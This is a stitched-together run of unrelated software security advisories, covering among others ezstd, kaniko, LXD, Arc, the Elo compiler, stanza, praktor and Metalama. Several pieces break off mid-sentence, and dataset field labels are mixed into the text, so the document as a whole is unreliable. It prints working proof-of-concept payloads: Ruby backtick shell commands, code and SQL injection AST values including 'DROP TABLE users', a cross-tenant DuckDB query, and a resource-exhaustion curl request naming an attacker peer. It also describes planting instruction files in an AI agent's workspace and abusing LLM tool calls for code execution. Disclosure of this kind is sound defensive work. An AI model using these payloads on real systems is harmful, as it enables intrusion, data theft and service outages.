Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in silviucpp ezstd allows an attacker who supplies a zstd frame to ezstd:decompress_using_ddict/2 to exhaust memory and terminate the Erlang VM via a small frame that declares a very large content size.

zstd_nif_decompress_using_ddict in c_src/ezstd_nif.cc reads the frame's declared content size with ZSTD_getFrameContentSize and passes it directly to enif_make_new_binary, without the 1 GiB MAX_BUFFER_SIZE check that ezstd:decompress/1 applies before allocating. A valid 65,550-byte frame of RLE blocks declaring 2 GiB is rejected by ezstd:decompress/1 but is fully allocated and decompressed by the dictionary path. The allocation happens inside a NIF, so when it exceeds the memory available to the VM the operating system kills the whole node rather than the calling process.

This issue affects ezstd: from 1.0.5 before 1.2.5.

Due to a missing check, the mirror-target Ingress annotation can be used to target an unauthenticated configuration API within the ingress-nginx controller, allowing write commands to be submitted. Corrupting the data within that configuration API results in all traffic through ingress-nginx being dropped until an Ingress configuration change or a controller restart causes the data to be recreated correctly.

In principle, this write access could also be used to redirect traffic from other Ingresses controlled by the same ingress-nginx instance. In practice, there is negligible additional risk: such redirection would require privileged information about internal ingress-nginx state, and users can already redirect traffic from other Ingresses controlled by the same ingress-nginx anyway.

The issue occurs when an attacker who belongs to multiple organizations initiates a login and then switches to a registration or password reset path. ## Summary

The IPFS Pinning Service API implementation accepts a caller-controlled CID through `POST /pins`, queues background processing, and then recursively fetches the full DAG with `helia.pins.add(cid)`. The route and background pinning path do not enforce a request rate limit, per-user quota, maximum DAG byte count, maximum block count, traversal timeout, or concurrent pinning limit.

An authenticated caller, or an unauthenticated caller when the server is started with `ALLOW_NO_AUTH=true`, can submit one or more pins whose CIDs resolve to very large DAGs. The server writes fetched blocks to CAR files under `carStoragePath` and can consume disk, network, CPU, and libp2p resources until the process or host becomes unavailable.

## Details

`POST /pins` validates only that the request body contains a syntactically valid CID string, then forwards it to the pin store:

- `src/filecoin-pinning-server.ts:304-342` accepts the request, parses `cid` with `CID.parse`, and calls `pinStore.pin(request.user, cidObject, parsed.options)`.
- `src/filecoin-pin-store.ts:153-188` stores the pin as `queued` and schedules `_processPinInBackground` with `setTimeout`. There is no queue, semaphore, or global cap around this scheduling.
- `src/filecoin-pin-store.ts:211-217` creates a per-pin Helia node and forwards caller-supplied `origins`.
- `src/filecoin-pin-store.ts:260-274` walks the full DAG with `for await (const pinnedCid of helia.pins.add(cid))`.
- `src/create-pinning-helia.ts:47-80` creates a libp2p/Helia node with the Bitswap block broker and no application-level resource limits.
- `src/core/car/car-blockstore-base.ts:65-107` writes every fetched block and updates `stats.totalSize` only after writing.
- `src/core/car/car-file-backend.ts:84-93` streams blocks to the CAR writer on disk.

The Helia node created for each pin has no bootstrap or mDNS configuration (`src/create-pinning-helia.ts:57`). A public CID alone may therefore not be fetchable unless the node can reach a content source. In practice, the API also accepts `origins`, so an attacker can supply a reachable attacker-controlled libp2p origin that serves a large DAG and cause the server to retrieve it.

## Impact

Successful exploitation affects availability:

- Disk exhaustion from unbounded CAR files in `carStoragePath`.
- Network exhaustion from recursive Bitswap retrieval.
- CPU and memory pressure from concurrent libp2p/Helia pin operations.
- Service degradation or process failure for other users of the daemon.
- Operational cost and manual recovery burden from large partial CAR files.

The default daemon configuration reduces exposure because the server binds to `localhost` and refuses to start without an access token unless `ALLOW_NO_AUTH=true`. The finding is most significant when the daemon is exposed beyond localhost, when the token is shared across untrusted users, or when the no-auth mode is enabled.

## PoC

```bash
curl -X POST "https://target.example/pins" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "cid": "CID_OF_LARGE_DAG",
    "origins": ["/ip4/203.0.113.10/tcp/4001/p2p/ATTACKER_PEER_ID"],
    "meta": { "purpose": "resource-exhaustion-validation" }
  }'
```

Submitting many such requests concurrently accelerates resource pressure because each request schedules independent background processing.

## Summary

  `banks` parses `Tool` JSON objects from the rendered body of `{% completion %}` blocks and later resolves their
  `import_path` field through `importlib.import_module(...)` + `getattr(...)` to obtain the callable that handles a tool
   call. There is no allowlist or sanitization on `import_path`, so any importable Python attribute (e.g. `os.system`,
  `subprocess.getoutput`) can be selected. When the LLM emits a `tool_calls` entry whose `function.name` matches the
  attacker-supplied tool name, the resolved callable is invoked with kwargs decoded from `tool_call.function.arguments`,
   yielding arbitrary code execution in the banks-hosting process.

  This is distinct from GHSA-gphh-9q3h-jgpp / CVE-2026-44209. That advisory was fixed in 2.4.2 by switching

  `src/banks/extensions/completion.py`, and the unsafe import + getattr chain still executes on 2.4.2. The malicious

### Summary

kaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azurecr.io.attacker.com/img`, is enough. The build needs no `RUN` instruction and never has to push.

The flaw is in the Azure Container Registry (ACR) credential helper, `github.com/chrismellard/docker-credential-acr-env`. kaniko links it into the executor and warmer (the built-in helper) and also builds it as the standalone `docker-credential-acr-env` binary. The helper decides whether a host is an ACR registry with an unanchored regex, so any hostname that contains `.azurecr.io` (or `.azurecr.cn`, `.azurecr.de`, `.azurecr.us`) passes. The upstream module is unmaintained and has no fixed release. The Go vulnerability database tracks the upstream flaw as [GO-2026-6225](https://pkg.go.dev/vuln/GO-2026-6225).

### Who is affected

You are affected if you run kaniko before v1.25.20 on Dockerfiles, or build arguments, that you don't fully control, in an environment where the helper can get an Azure identity:

- service principal credentials in the environment (`AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID`)
- a federated workload identity token (`AZURE_FEDERATED_TOKEN` or `AZURE_FEDERATED_TOKEN_FILE`, with `AZURE_CLIENT_ID` and `AZURE_TENANT_ID`), as injected by AKS workload identity
- a managed identity, through the Azure Instance Metadata Service (for example on an AKS node or Azure VM) or `MSI_ENDPOINT`

You do not need to use ACR, or configure the helper, to be affected. kaniko consults the built-in helper for any registry that has no credentials in your Docker config and is not a Google or Amazon ECR registry, and every lookalike host falls in that set. That covers base images in `FROM` lines and images in `COPY --from=<image>`. kaniko asks for credentials before it contacts the registry, so the attacker's registry doesn't need to request authentication.

If your Docker `config.json` sets `"credsStore": "acr-env"`, the standalone binary is consulted for every registry as well. Before v1.25.20 this setting broke pulls from non-ACR registries, so it is uncommon.

### Impact

The helper puts the token in both the `Authorization: Bearer` header and the `access_token` form field of a POST to `https://<host>/oauth2/exchange`, so the attacker receives a live access token for Azure Resource Manager. Until it expires, the attacker can use it against Azure Resource Manager with the identity's role assignments. They can also exchange it, as the helper does, at the `/oauth2/exchange` endpoint of any real ACR registry the identity can access, and so obtain registry credentials. If the identity has `AcrPush` or higher, the attacker can push images to your registries.

### Patches

Fixed in [v1.25.20](https://github.com/chainguard-forks/kaniko/releases/tag/v1.25.20) by [#495](https://github.com/chainguard-forks/kaniko/pull/495). kaniko now carries a patched copy of the helper under `third_party/docker-credential-acr-env`, which the executor, the warmer and the `docker-credential-acr-env` binary built by `deploy/Dockerfile` all use. The patched helper accepts a host only if it is exactly `host[:port]` and the hostname is `mcr.microsoft.com` or a well-formed name ending in `.azurecr.io`, `.azurecr.cn`, `.azurecr.de` or `.azurecr.us`. For any other host it reports "credentials not found" without requesting a token.

This repository publishes no binaries or images. Rebuild the executor, the warmer and `docker-credential-acr-env` from v1.25.20 or later. If you import kaniko as a Go module, update `github.com/chainguard-dev/kaniko` to v1.25.20 or later.

From v1.25.20, kaniko no longer depends on `github.com/chrismellard/docker-credential-acr-env`, so scanners stop reporting GO-2026-6225 for it.

### Summary

A guest can mount another guest's custom storage volume over `/dev/lxd` and read or write its contents without owning it. The DevLXD storage API blocks access to volumes you don't own, but the instance device-update path that attaches a volume to a container without checks ownership. Any guest in a project with `security.devlxd.management.volumes` enabled can attach a volume belonging to a different guest by naming it in a device `PATCH`, giving one tenant full read and write access to another tenant's volume data.

### Details

Volumes created over DevLXD get `volatile.devlxd.owner` set to the calling identity. The storage handlers enforce it on `GET`/`PUT`/`DELETE` ([`isDevLXDVolumeOwner`, lxd/devlxd_storage.go:359](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_storage.go#L359)) and on volume-copy sources ([devlxd_storage.go:286](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_storage.go#L286)). The device-attach path does not.

`devLXDInstancePatchHandler` ([lxd/devlxd_instances.go:88](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L88)) passes the guest's device map to `generateDevLXDInstanceDevices` ([devlxd_instances.go:178](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L178)). For a device that isn't already on the instance, the only check is `isDeviceAccessible(device)`:

```go
if (exists && !isOwned) || (!isDeviceAccessible(device)) 
```

`exists` is false for a newly added device, so `isDeviceAccessible` is the whole gate. It resolves to `newDevLXDDeviceAccessValidator` ([devlxd_instances.go:250](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L250)), which is `diskDeviceAllowed && filters.IsCustomVolumeDisk(device)`. `IsCustomVolumeDisk` ([lxd/device/filters/disk.go:28](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/device/filters/disk.go#L28)) checks the device shape only: `type=disk`, non-empty `source`, non-empty `pool`. It never loads the `(pool, source)` volume or compares its owner to the caller.

The handler then sets `volatile.<dev>.devlxd.owner` to the caller and issues an in-process `PATCH` to `instancePatch` ([lxd/instance_patch.go:55](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/instance_patch.go#L55)). That call skips the HTTP access handler and runs only project quota checks (`limits.AllowInstanceUpdate`, [instance_patch.go:215](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/instance_patch.go#L215)) before `c.Update`. The disk device's `validateConfig` confirms the volume exists but does no ownership or RBAC check. A guest can therefore point a new disk device at any custom volume in its project and LXD mounts it. The recorded device owner becomes the attacker while the volume's `volatile.devlxd.owner` still names the victim.

### PoC

Built from source at HEAD `d29ece6284` (reports as `6.8`, API extension `devlxd_volume_management`); single host, `dir` pool, default project.

Host setup, two guests with separate DevLXD identities, each scoped to edit only its own instance:

```bash
lxc launch images:alpine/edge guesta -c security.devlxd=true -c security.devlxd.management.volumes=true
lxc launch images:alpine/edge guestb -c security.devlxd=true -c security.devlxd.management.volumes=true
lxc exec guesta -- apk add --no-cache curl ; lxc exec guestb -- apk add --no-cache curl

for g in a b; do
  lxc auth identity create devlxd/id$g

### Summary

The fix for CVE-2026-47735 (released 2026.06.1) is incomplete. It added a DuckDB sandbox (`SET GLOBAL allowed_directories=[<storage root>]; SET GLOBAL enable_external_access=false`) and an Arc SQL-layer denylist of the **literal** functions `read_parquet(` and `arc_partition_agg(`. The sandbox correctly blocks reads **outside** the storage root (OS files, `http://` SSRF), but it allowlists the **entire multi-tenant storage root**, and the SQL denylist still misses the rest of the DuckDB I/O family the original advisory enumerated. As a result, any authenticated token — including one with `permissions: []` — can read or enumerate **every other database's data** within the deployment, defeating RBAC.

Verified at HEAD `c08b892` (`v26.06.1-36`, includes 26.06.2). Confirmed still live; no later commit blocks these functions.

### Root cause (three composing gaps)

1. **Sandbox scope is the whole storage root, not the tenant.** `internal/database/sandbox.go:111` allowlists `cfg.LocalStorageRoot` (default `storage.local_path=./data/arc`). Every database lives under it — `internal/storage/util.go:33` `GetStoragePath` => `<base>/<database>/<measurement>/**/*.parquet`. Any in-root path is sandbox-permitted regardless of which database owns it.
2. **RBAC never inspects table-valued functions.** `checkQueryPermissions` (`internal/api/query.go:1181`) extracts table refs via `extractTableReferences`, which skips any name followed by `(` as a function (`internal/api/query.go:1116`); with zero refs it returns allow (`:1213-1216`). So `parquet_scan(...)`, `glob(...)`, `parquet_metadata(...)`, `read_blob(...)`, `read_csv_auto(...)` are never authorization-checked.
3. **The SQL denylist matches only the literal spelling.** `userSQLReadParquetPattern` (`internal/api/query.go:2087`) is `\bread_parquet\s*\(`. DuckDB's documented alias **`parquet_scan(`** is not matched, and `read_csv_auto`/`read_json`/`read_text`/`read_blob`/`glob`/`parquet_metadata`/`parquet_schema` are not blocked anywhere. The fix author documented this very threat at `internal/api/query.go:2061-2064` (“a user scoped to db1.m1 could read /data/db2/secrets/**/*.parquet”) but blocked only the literal `read_parquet(`.

### Exploit (authenticated, any token incl. permissions:[])

```
POST /api/v1/query
Authorization: Bearer <token>
Content-Type: application/json
{"sql": "SELECT * FROM parquet_scan('./data/arc/<victim-db>/<measurement>/**/*.parquet')"}
```

- `ValidateSQLRequest` passes (`parquet_scan(` is not `read_parquet(`, not a dangerous keyword, single statement).
- `checkQueryPermissions` extracts 0 table refs (it is a function call) and allows.
- `convertSQLToStoragePaths` finds no `read_parquet` literal and no bare `FROM measurement` to rewrite, so the query passes through unchanged.
- DuckDB runs `parquet_scan('<root>/<victim-db>/...')`; the path is inside `allowed_directories`, so the other database's rows are returned.

`glob('./data/arc/**/*')` enumerates every database/measurement/file; `parquet_metadata(...)`/`parquet_schema(...)` leak column names and per-column min/max value statistics; `read_blob(...)` returns raw file bytes. All operate within the allowlisted root.

### Proof (poc/poc_sandbox_alias_bypass.py, poc/OUTPUT.txt)

Reproduces Arc's exact sandbox config (`allowed_directories=[<root>]`, `enable_external_access=false`) on DuckDB 1.5.x (Arc pins duckdb-go-bindings 1.5.1) with a victim parquet written under the root:

```
[BLOCKED ] read_blob OUTSIDE root            -> Permission Error: Cannot access file ...
[EXECUTES] parquet_scan victim (read_parquet ALIAS) -> [('tenant-VICTIM-row', 42)]
[EXECUTES] glob enumerate every db under root -> [('.../data/arc/victim-db/secrets/f.parquet',)]
[EXECUTES] parquet_metadata victim           -> [('leaked','tenant-VICTIM-row','tenant-VICTIM-row'), ('v','42','42')]
```

The sandbox blocks escape (as designed) but permits every in-root cross-database read.

### Impact

Cross-database / cross-tenant confidentia

items.summary: ### Summary ODF style attribute values are interpolated into `style="..."` attributes without HTML-escaping in **both** of odf-kit's to-HTML renderers (`odtToHtml` and `odsToHtml`). A double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary HTML/attribute injection — and therefore script execution (XSS) — from a crafted `.odt` or `.ods` file wherever the rendered output is inserted as HTML, which is the documented purpose of both functions. ### Details #### ODT renderer (`src/odt/to-html/html-renderer.ts`) The renderer has an `escapeHtml()` helper and applies it consistently to text content and to attribute values — `href`, `src`, `alt`, `id`, `data-author`, `data-date`, citation text all go through it. The inline CSS strings do not. In `renderTextSpan` (dist/odt/to-html/html-renderer.js:195): ```js const css = spanStyleToCss(span.style); if (css) html = `${html}`; ``` The value of e.g. `fo:color` is copied from the document into `style.fontColor` verbatim by the parser (`extractSpanStyle`, read/parser.js:348), then concatenated raw into the attribute. A `"` in the value terminates the attribute early. The same unescaped `style="${...}"` pattern appears at roughly ten other emission sites: paragraph and heading (`paragraphStyleToCss`), table cells and rows (`cellStyleToCss`, `rowStyleToCss`), ``, and the image style attribute. The affected source attributes include `fo:color`, `fo:background-color`, `fo:text-shadow`, `fo:letter-spacing`, `fo:font-family` (via both direct and font-face resolution), `fo:margin-*`, `fo:padding-*`, `fo:line-height`, `fo:border*`, and `style:vertical-align`. #### ODS renderer (`src/ods/to-html/html-renderer.ts`) — same bug `buildInlineStyle()` assembles the CSS string from cell formatting properties — `fo:color`, `fo:font-size`, `fo:font-family`, `fo:background-color`, `fo:text-align`, etc. — with zero `escapeHtml` calls, and `renderCell` emits it raw (line 65): ```ts if (includeStyles && cell.formatting) { const style = buildInlineStyle(cell.formatting); if (style) attrs.push(`style="${style}"`); } ``` Additionally, `row.height` (from `style:row-height`) goes raw into the row element (line 95): ```ts const style = includeStyles && row.height ? ` style="height:${row.height}"` : ""; return `${cells}`; ``` The same injection is reachable through the public `odf-kit/ods/to-html` export (`odsToHtml()`), so both to-HTML directions are affected. #### Version scope The `odt/to-html` and `ods/to-html` modules first shipped in **0.14.0**; the current latest release is **0.14.1**. ## TL;DR

Loading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `Trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. Result: `weights_only=True` gives no protection here, and model loading executes code.

Confirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload `__reduce__` returns `(os.system, (cmd,))` ran the command at load time (marker file showed `uid=501(...)`, `executed_by=...`).

A downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. `stanza.Pipeline(lang=..., processors="tokenize,pos,lemma", lemma_model_path="<attacker-influenced .pt>")` (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into `Trainer.load` -> `_unpack_pos_dict` and executes the embedded pickle at construction time.

    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:

    return pickle.loads(raw)                # <-- unrestricted default unpickler

No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.

Note: this is **not** the `weights_only=False` fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.

### Summary

An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host JavaScript runtime. A payload built from the `.constructor.constructor` chain compiles, without modification, to a live `Function` invocation in the emitted JavaScript, escaping any sandbox assumption around "Elo is a safe data/DSL language."

### Vulnerable sink and root cause

Three interacting sites in `src/` produce the bug at commit `749af7b`:

1. **`src/transform.ts:144–158`** — the `member_access` handler allows access on types `any`, `object`, or `array` without filtering the property name. This is the only place an integrator could have plugged a denylist.
2. **`src/compilers/javascript.ts:210`** — the JS emitter writes `${objectExpr}.${ir.property}` verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript.
3. **`src/parser.ts:163–170, 748–750`** — the parser accepts `constructor` (and other JS meta-property names) as an ordinary identifier, so `.constructor` clears type-checking without triggering any warning.

Combined, the Elo expression `({}).constructor.constructor('…')()` compiles to a live `Function('…')()` call in the emitted JS, executing in the realm of whichever sink runs the compiled code.

### Summary

Elo's Ruby backend emits attacker-controlled text into Ruby double-quoted strings without escaping the `#` character. Because `#` begins Ruby's interpolation sequences — `#{expr}`, `#@ivar`, `#@@cvar`, `#$gvar` — and any expression wrapped in `#{...}` may use backticks for shell execution, an Elo program that contains a crafted string literal or a labelled subtype constraint compiles to Ruby that evaluates attacker-chosen Ruby, and through backticks runs attacker-chosen shell commands, at runtime.

The same Elo source compiled to JavaScript, Python, or SQL is benign, so the bug also breaks the cross-target portability guarantee the rest of the compiler honours.

### Vulnerable sinks

Two sinks exist in `src/compilers/ruby.ts` at commit `749af7b`:

1. **String-literal emitter — lines 180–184.**
   The emitter escapes backslash, double quote, and control characters, but not `#`. Any `#{...}` sequence in an Elo string literal flows straight into the emitted Ruby source.

2. **Labelled subtype-constraint branch — lines 405–412.**
   The error message passed to `p_fail(p, "...")` is wrapped in a Ruby double-quoted string with no escape pass at all. Because the parser at `src/parser.ts:1339–1348` accepts single-quoted Elo strings as constraint labels, a label such as `'#{` `` `id` `` `}'` flows unchanged into the emitted Ruby.

### Attack surfaces

All three surfaces share the same root cause (the missing `#` escape in the Ruby double-quoted-string emission path) and are addressed by the same patch:

| # | Entry point | Threat model |
|---|---|---|
| 1 | `/try` playground on elo-lang.org (Ruby target) | 0-click server-side RCE against elo-lang.org infrastructure from a shared PoC URL |
| 2 | `bin/eloc -t ruby -x` on a CI or DevOps host | RCE on any host that passes Elo strings through the CLI |
| 3 | Library API — `defaultFormats.elo.parse()` with a Ruby emission step | Ruby RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases) |

### Proof of Concept

**String-literal sink:**

```
# poc.elo
'RES=#{`id 2>&1`}'
```

```
$ eloc -t ruby -x poc.elo
# emitted Ruby contains:  "RES=#{`id 2>&1`}"
# running it returns the output of id(1).
```

Replacing `` `id 2>&1` `` with `` `touch /tmp/pwned` `` produces a trivially observable filesystem side effect.

**Subtype-constraint label sink:**

```
# poc-subtype.elo
let X = Int(i | '#{`touch /tmp/pwned2`}': i > 0) in X(-1)
```

The predicate fails for `-1`, causing `p_fail(p, "#{...}")` to interpolate and execute the backtick command at the Ruby layer.

Both flows are automated in the reproduction script submitted with the original report and were verified against Ruby 3.x.

### Root cause

The Ruby-emitter's double-quoted-string escape routine omitted `#` from its character set, and one emission path (the subtype-constraint label branch) performed no escape pass at all.

### Summary

Elo's programmatic AST API accepts arbitrary values in many node fields without runtime type or syntax validation. Each backend's emit stage interpolates those values straight into the generated source with no escape pass. An integrator that populates the AST from JSON-deserialised input, plugin output, or any other untyped source therefore exposes a code-injection primitive that flows through to the emitted JavaScript, Ruby, Python, or SQL.

The same pattern was previously addressed in **0.9.7 (2026-01-27)**, which patched the date/datetime/duration literal emitters via `JSON.stringify()` after a report by **naoyashiga**. This advisory generalises that fix to the remaining AST surface — at least 23 emission sites across six node-field categories and four backends.

### Vulnerable sinks

Each row is a category of sinks that share the same shape: TypeScript signature erased at runtime → AST-API consumer passes a crafted value → emit interpolates the value verbatim.

| # | AST field | Affected backends | Resulting injection |
|---|---|---|---|
| 1 | `int_literal` / `float_literal` `.value` | JS, Ruby, Python, SQL | Arbitrary expression in the emitted numeric position (RCE on JS/Ruby/Python; SQL expression injection) |
| 2 | `variable.name` | JS, Ruby, Python, SQL | Identifier-position injection; on SQL, raw SQL injection because undefined identifiers are intentionally emitted as column references |
| 3 | `member_access.property` | JS, Ruby, Python, SQL | Property access escaped into expression (RCE) |
| 4 | `object_literal` key | JS, Ruby, SQL | Computed-key / extra-property injection (RCE on JS/Ruby; SQL injection) |
| 5 | `datapath` segment | JS, Ruby, Python, SQL | Ruby symbol-list injection allows backtick shell exec; SQL string-segment unquoted in single-quote context allows SQL injection |
| 6 | `lambda.params[].name` | JS, Ruby, Python | Parameter-list structural injection (RCE) |
| 7 | SQL `let` binding `name` | SQL | Identifier injection in `… AS <name>` clause |

### Proof of Concept

End-to-end execution was verified at commit `749af7b` for representative cases per backend. Examples:

**Numeric literal injection (all four backends).** Feeding the following AST through `compileToJavaScript` emits a live `console.log` on call:

```js
{ type: 'literal', value: "(console.log('PWN_INT_JS'),1)" }
// emits: (function(_) { return (console.log('PWN_INT_JS'),1); })(null);
```

The same AST against Ruby with `"(system('touch /tmp/pwn_int_ruby'); 1)"` creates the file; Python with `"(print('PWN_INT_PY') or 1)"` prints the sentinel; SQL emits the raw string into the numeric position.

**SQL `variable.name` injection:**

```js
{ type: 'variable', name: "1; DROP TABLE users; --" }
// emits: 1; DROP TABLE users; --
```

**Ruby `datapath` segment shell-exec:**

```js
{ type: 'datapath', segments: ["a, system(`touch /tmp/pwn_dp_ruby`)"] }
// emits: [:a, system(`touch /tmp/pwn_dp_ruby`)]
```

All ten end-to-end cases are automated in the `ast-exec.js` / `ast-exec2.js` scripts attached to the original report; each `console.log` and sentinel file was observed.

### Independence from GHSA #2

This finding is independent of **GHSA #2** (the `.constructor.constructor` sandbox escape). That report covers payloads delivered as plain Elo *strings* through the parser; the present advisory covers payloads delivered as AST *objects* through the programmatic API. The two threat models do not overlap: GHSA #2's identifier regex `^[a-zA-Z_][a-zA-Z0-9_]*$` accepts `constructor` (and is the right behaviour for a parser), while the present advisory adds runtime validation at every backend emit site so that AST-API consumers cannot inject arbitrary text into emitted source.

items.summary: ## Executive summary A buffer overflow vulnerability exists in the Brotli decompression library used by .NET. This vulnerability may allow an unauthenticated attacker to read or corrupt process memory. This could lead to information disclosure, denial of service, or elevation of privilege. ASP.NET Core and HttpClient do not automatically decompress Brotli data in their default configurations. Applications are exposed when they enable Brotli decompression or explicitly use Brotli decompression APIs to process attacker-controlled data, as described below. .NET Framework is not affected. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/494 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 8.1 - **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` - **Weakness:** CWE-787 (Out-of-bounds Write) ## Affected Platforms - **Platforms:** All - **Architectures:** All ## Mitigations ASP.NET Core request decompression and HttpClient automatic response decompression are not enabled by default. An application is not exposed merely because an affected .NET package is installed. Exposure requires the application to decompress attacker-controlled Brotli data through one of these paths: - Enable ASP.NET Core [automatic request decompression](https://learn.microsoft.com/aspnet/core/fundamentals/middleware/request-decompression) with Brotli (`br`) support. - Enable HttpClient automatic response decompression by configuring [HttpClientHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.httpclienthandler.automaticdecompression) or [SocketsHttpHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.socketshttphandler.automaticdecompression) to include [DecompressionMethods.Brotli](https://learn.microsoft.com/dotnet/api/system.net.decompressionmethods) or `DecompressionMethods.All`. - Explicitly use Brotli decompression APIs in `System.IO.Compression`, such as `BrotliStream` or `BrotliDecoder`. Until the update can be deployed, avoid decompressing attacker-controlled Brotli data. The following examples show how to disable Brotli decompression if you are already using it. > **Warning: Do not use these code snippets if you are not already using decompression.** Do not introduce a call to `AddRequestDecompression` if your application does not already call it. Similarly, do not introduce an `AutomaticDecompression` property assignment if your application does not already set that property. Modify only your existing decompression configuration. Enabling automatic decompression can introduce denial-of-service risks even when Brotli is excluded. If you are already using Brotli request decompression in ASP.NET Core, exclude it by removing the `br` entry from your existing decompression configuration. This retains the default gzip and deflate providers: ```csharp builder.Services.AddRequestDecompression(options => { options.DecompressionProviders.Remove("br"); }); ``` If your application already enables HttpClient automatic response decompression, disable Brotli by updating the flags on your existing handler so they do not include `DecompressionMethods.Brotli`: ```csharp var handler = new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate }; var httpClient = new HttpClient(handler); ``` Applications that directly use Brotli decompression APIs must stop passing untrusted Brotli data to those APIs until updated. Ensure that other application code does not continue to decompress the same untrusted Brotli data. These changes can affect normal request and response handling and should be tested before deployment. Installing the security update remains the recommended fix. ## Affected Packages The vulnerability affects .NET applications using an affected Brotli decoder in the runtime or NativeAOT

### Impact

A remote Telegram user can write files to arbitrary paths inside an agent's persistent workspace volume (`praktor-wk-<workspace>`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory.

The attacker controls the Telegram document filename, which was concatenated into the destination path without sanitization (`internal/telegram/bot.go`, at both upload sites) and resolved with `path.Join`, which collapses `../` sequences. A filename like `../../../CLAUDE.md` resolved to the root of the agent workspace volume, outside `uploads/`.

Because the agent workspace is the persistent working directory the Claude agent reads from and operates on across runs, writing outside `uploads/` lets an attacker plant or overwrite files the agent later consumes — e.g. `CLAUDE.md`, agent instruction/skill/hook files, or other config under `/workspace/agent`. This turns a file upload into a stored injection into the agent's instruction/execution surface (CWE-22 path traversal escalating to stored instruction injection).

### Reachability

By default the bot has no user allowlist (`allow_from: []` means "allow all"), so the only precondition is that a user can message the bot. No authentication or prior privilege is required.

### Affected versions

Through `v0.9.0` (and HEAD `3902d29`).

### Patched versions

`v0.9.1`, containing PR #228.

### Workarounds

Restrict `telegram.allow_from` to trusted user IDs to limit who can send uploads to the bot. Upgrading to `v0.9.1` is the recommended fix.

### Fix (defense in depth)

- `internal/telegram/bot.go`: apply `path.Base()` to the attacker-controlled filename at both upload sites, stripping directory components and `..`.
- `internal/container/manager.go`: `WriteVolumeBytes` now rejects any path that escapes `/vol` after `path.Join`, protecting future callers.

### Credit

Reported privately by [tonghuaroot](https://github.com/tonghuaroot), who provided a detailed root-cause analysis, a deployed end-to-end proof of concept against the real `container.Manager`, and fix verification.
items.title: praktor: Path traversal in Telegram file uploads allows writing outside the agent workspace uploads/ directory (stored instruction injection)

## Summary

Metalama uses a local named-pipe channel to communicate between its Visual Studio processes — the Visual Studio UI process (`devenv`), the out-of-process Roslyn code-analysis process, and the CodeLens process. This channel deserialized messages from the pipe **without restricting which CLR types could be instantiated**. A local process able to write to the pipe can send a crafted message that instantiates arbitrary .NET types — a deserialization primitive in the same class as `BinaryFormatter` (CWE-502), and a well-known gadget-chain code-execution vector.

The flaw is present, via two successive serializers, in **every Metalama release from the first public version (2023.0) up to and including 2026.1.18**, and is fixed in **2026.1.19**.

The pipe name is predictable: `Metalama_{role}_{processId}_{hash(PackageVersion)}`, derived from the public package version and a locally-enumerable process id. This channel is used by the Visual Studio integration only (Windows named pipes); it is not used for command-line / MSBuild builds.

## Mechanisms

**JSON era — Metalama 2023.0 through 2026.0.x (Newtonsoft.Json).** The pipe formatter enabled polymorphic type embedding:
```csharp
formatter.JsonSerializer.TypeNameHandling = TypeNameHandling.All;   // ServiceEndpoint.cs (early), later BaseEndpoint.cs
```
The accompanying `SerializationBinder` (added later for multi-version assembly support) only **remapped assembly names**; its `BindToType` resolved **any** type name from the wire (`assembly.GetType(typeName)`) with **no type allow-list**. `TypeNameHandling.All` is the canonical unsafe-deserialization setting and has publicly available gadget chains (e.g. ysoserial.net), so this era is at least as exploitable as the later one. (Introduced by commit `0554368737`, first shipped in `release/2023.0.101-rc`.)

